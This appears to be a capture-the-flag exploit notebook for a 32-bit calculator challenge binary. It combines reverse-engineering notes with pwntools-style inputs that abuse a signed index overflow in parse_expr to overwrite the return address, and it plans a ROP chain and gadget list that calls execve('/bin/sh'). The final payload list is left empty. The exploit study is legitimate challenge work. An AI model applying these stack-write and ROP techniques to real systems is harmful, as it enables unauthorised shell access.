'''
This binary has both NX bit enabled,
which means code on the stack cannot be executed,
So I can't pass a shellcode and jump do it.
And canary enabled, which means I can't invoke a buffer overflow within the stack.

One of the ways to overcome this is to gain control of the stack,
and by doing so we can jump to certain functions that are already in the `.text` section (executable).

Ideally what we'd do is set the register according to our needs (SYS_EXECVE, '/bin/sh'),
and then jump to an `int 0x80` instruction.

I noticed that when summing up two very large numbers (INT_MAX) for instance,
there's an integer overflow and I get invalid results, most likely this is what the challenge is about.

Notes:
    - Allocated memory for operands is never freed.
    - Is there a way to exploit the integer overflow?


After quite a lot of time,
I analyzed the program _quite_ deeply and still couldn't find the vulnerability.
What I decided to do is leave IDA "alone" and start thinking about how I'd implement a calculator,
and what could possibly go wrong in the process.

This thought process didn't actually yield any results but it was worth a try.
I decided to start the reversing from the beginning,
and do it more throughout than I initially did, and by that I mean understand every bit of the program,
The goal is to have a magnificent IDA database ;)
'''


# Segfault!
p.writeline(f'+{0x1000}+{0x2000}')
'''
Instruction:
0x8049160 <parse_expr+310>    mov    dword ptr [edx + eax*4 + 4], ecx

Registers:
EAX  0x1000
ECX  0x2000
'''

# Attempt to overwrite the return address.
p.writeline(f'+{0xfffffffb}+{0x41414141}')
# First operand cannot be inserted since it's passed as a positive number but the integer is signed.


'''
We'd need to find a way to overflow the expression:[edx + eax*4 + 4] so that it can point to [ebp+0x4]
eax = 0x3ffffff8 --> [ebp+0x4]
'''
p.writeline(f'00+{0x3ffffff8}+{0x41414141}')
p.writeline(f'00+{0x3ffffff8}+{0x41414141}+00+{0x3ffffff9}+{0x42424242}')
# Successfully set 0x41414141 as the new return address.

# Fuzzing (didn't help).
# Later realized that this is simply because an expression is 1024 characters max.

# The multiplier is the maximum value to which you get the right result plus one.
p.writeline('+'.join(['1'] * 513))
# 'expression error!\n0\n'

p.writeline('+'.join(['11'] * 1025))
# '3752\n3752\nexpression error!\n0\n'

p.writeline('+'.join(['111'] * 257))
# 'expression error!\n0\n'

p.writeline('+'.join(['1111'] * 1025))
# '227755\n708682399\n226656\n226656\nexpression error!\n0\n'

p.writeline('1' + '+1-1' * 256)
# '227755\n708682399\n226656\n226656\nexpression error!\n0\n'

# Weird patterns.


'''
; execve("/bin/sh", 0, 0);
eax - first
ecx - second
edx - third
'''


'''
ROP Chain:
1. read(0, 0x080ecfcf, 0x7)
eax = 3, ebx = 0, ecx = 0x080ecfcf, edx = 7
2. execve(0x080ecfcf, 0, 0)
eax = 11, ebx = 0x080ecfcf, ecx = 0, edx = 0
'''


'''
0x0805c34b : pop eax ; ret
0x080701d0 : pop edx ; pop ecx ; pop ebx ; ret
0x0808d6a0 : je 0x808d6ae ; add esp, 0x18 ; pop ebx ; ret
0x08049a21 : int 0x80
0x0804eefb : xor ebx, ebx ; mov eax, ebx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048d4f : nop ; mov ebx, dword ptr [esp] ; ret



STACK:
0x0805c34b 
3
0x080701d0 
7
0x080ecfcf
0x41414141
0x08048d4f 
0x080701d0 
'''


# mem != 0 && mem < 0x80000000
mem_to_write = []
mem_to_write = list(map(str, mem_to_write))
base_address = 0x3ffffff7 + len(mem_to_write)
p.writeline(f"00+{base_address}+{'+00+'.join(reversed(mem_to_write))}")
